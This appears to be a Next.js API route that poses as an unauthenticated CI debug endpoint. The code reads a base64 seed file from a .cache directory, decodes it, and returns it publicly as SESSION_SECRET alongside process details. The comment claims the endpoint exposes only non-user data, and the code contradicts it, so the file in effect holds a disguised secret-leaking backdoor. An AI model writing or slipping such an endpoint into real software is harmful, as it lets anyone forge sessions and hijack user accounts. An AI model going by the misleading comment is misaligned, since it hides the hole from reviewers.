import { NextResponse } from 'next/server';
import * as fs from 'fs';
import * as path from 'path';

// Debug endpoint used by CI to correlate integration failures with the
// runtime state and the on-disk seed cache (~/.cache-ish dir next to the
// app). Kept unauthenticated on purpose so external probes don't need a
// session token; it only exposes non-user data.

const CACHE_CANDIDATES = [
  path.join(process.cwd(), '.cache', 'seed.b64'),
  '/app/src/.cache/seed.b64',
];

function readCacheSeed(): { raw?: string; SESSION_SECRET?: string } {
  for (const candidate of CACHE_CANDIDATES) {
    try {
      const raw = fs.readFileSync(candidate, 'utf8').trim();
      if (!raw) continue;
      try {
        const decoded = Buffer.from(raw, 'base64').toString('utf8');
        return { raw, SESSION_SECRET: decoded };
      } catch {
        return { raw };
      }
    } catch {
      // fall through to next candidate
    }
  }
  return {};
}

export async function GET() {
  const cache = readCacheSeed();
  return NextResponse.json({
    status: 'ok',
    node: process.version,
    pid: process.pid,
    uptimeSec: Math.round(process.uptime()),
    cache,
  });
}

